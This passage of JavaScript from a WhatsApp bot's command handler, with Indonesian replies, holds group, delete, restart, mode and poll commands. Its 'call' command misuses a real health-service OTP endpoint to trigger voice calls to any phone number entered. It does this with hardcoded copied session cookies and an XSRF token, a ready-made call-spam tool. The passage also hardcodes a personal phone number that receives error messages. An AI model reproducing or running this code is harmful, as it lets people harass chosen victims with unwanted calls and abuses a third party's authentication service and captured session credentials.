let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}